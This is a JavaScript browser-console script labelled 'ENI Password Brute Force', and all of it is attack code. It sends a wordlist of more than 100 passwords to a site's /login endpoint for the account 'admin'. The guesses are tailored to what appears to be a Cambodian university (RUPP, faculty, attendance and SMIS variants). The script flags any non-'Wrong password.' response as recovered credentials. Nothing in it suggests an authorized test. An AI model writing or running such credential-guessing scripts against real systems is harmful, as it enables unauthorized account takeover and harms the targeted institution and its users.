// ENI Password Brute Force - Single Target
const targetEmail = "admin";

const passwords = [
  "password",
  "password123",
  "Password123",
  "rupp",
  "rupp123",
  "rupp2024",
  "rupp2025",
  "rupp2026",
  "123456",
  "12345678",
  "admin",
  "admin123",
  "welcome",
  "welcome123",
  "pengkun",
  "pengkun123",
  "kunpeng",
  "1234",
  "000000",
  "qwerty",
  "abc123",
  "iloveyou",
  "sunshine",
  "princess",
  "dragon",
  "football",
  "baseball",
  "letmein",
  "monkey",
  "shadow",
  "master",
  "hello123",
  "computer",
  "csd123",
  "csd@rupp",
  "faculty",
  "faculty123",
  "teacher",
  "teacher123",
  "lecturer",
  "lecturer123",
  "attendance",
  "smis",
  "smis123",
  "rupp@123",
  "Rupp@123",
  "Rupp123!",
  "Password@123",
  "P@ssw0rd",
  "P@ssw0rd123",
  "Cambodia",
  "Cambodia123",
  "phnompenh",
  "phnompenh123",
  "123456789",
  "123123",
  "111111",
  "qwerty123",
  "1q2w3e4r",
  "password1",
  "password12",
  "Password1",
  "Password12",
  "admin@123",
  "root",
  "root123",
  "toor",
  "guest",
  "user",
  "user123",
  "test",
  "test123",
  "demo",
  "demo123",
  "123qwe",
  "qwe123",
  "zxcvbnm",
  "1qaz2wsx",
  "qazwsx",
  "password!",
  "Password!",
  "pass123",
  "passw0rd",
  "passw0rd123",
  "secret",
  "secret123",
  "login",
  "login123",
  "welcome1",
  "welcome2024",
  "welcome2025",
  "welcome2026",
  "changeme",
  "changeme123",
  "default",
  "default123",
  "rupp.csd",
  "rupp.csd123",
  "cs.rupp",
  "cs.rupp123",
  "faculty@rupp",
  "faculty@rupp123",
  "Admin@123!",
];

let index = 0;
const delay = 800; // ms between attempts (be polite-ish)

console.log('%c[ENI] Starting password brute force...', 'color: #2f6fce; font-size: 16px; font-weight: bold;');
console.log('%c[ENI] Target: ' + targetEmail, 'color: #9333ea; font-weight: bold;');
console.log('%c[ENI] Testing ' + passwords.length + ' passwords...', 'color: #a66b18;');

async function tryLogin(password) {
  const hash = "00000000000000000000000000000000"; // dummy hash
  
  try {
    const r = await fetch('/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: targetEmail,
        password: password,
        hash: hash,
        device_type: "desktop",
        os_name: "Windows",
        browser_name: "Chrome"
      })
    });
    
    const text = await r.text();
    const lines = text.trim().split('\n');
    const jsonLine = lines.find(l => l.includes('"success"') || l.includes('"message"'));
    
    if (jsonLine) {
      const data = JSON.parse(jsonLine);
      if (data.message !== "Wrong password.") {
        console.log('%c[ENI] !!! SUCCESS OR UNEXPECTED RESPONSE !!!', 'color: #16a34a; font-size: 18px; font-weight: bold;');
        console.log('%c[ENI] Password: ' + password, 'color: #16a34a; font-size: 16px; font-weight: bold;');
        console.log('%c[ENI] Response:', 'color: #16a34a; font-weight: bold;', data);
        return true; // Stop
      } else {
        console.log(`%c[ENI] ${index + 1}/${passwords.length} WRONG: "${password}"`, 'color: #dc2626;');
      }
    }
  } catch(e) {
    console.log(`%c[ENI] ${index + 1}/${passwords.length} ERROR: "${password}"`, 'color: #f59e0b;', e.message);
  }
  return false;
}

async function run() {
  for (index = 0; index < passwords.length; index++) {
    const found = await tryLogin(passwords[index]);
    if (found) {
      console.log('%c[ENI] STOPPING — CREDENTIALS FOUND!', 'color: #16a34a; font-size: 20px; font-weight: bold;');
      break;
    }
    await new Promise(r => setTimeout(r, delay));
  }
  if (index >= passwords.length) {
    console.log('%c[ENI] All passwords tested. No match found in this batch.', 'color: #dc2626; font-size: 14px; font-weight: bold;');
  }
}

run();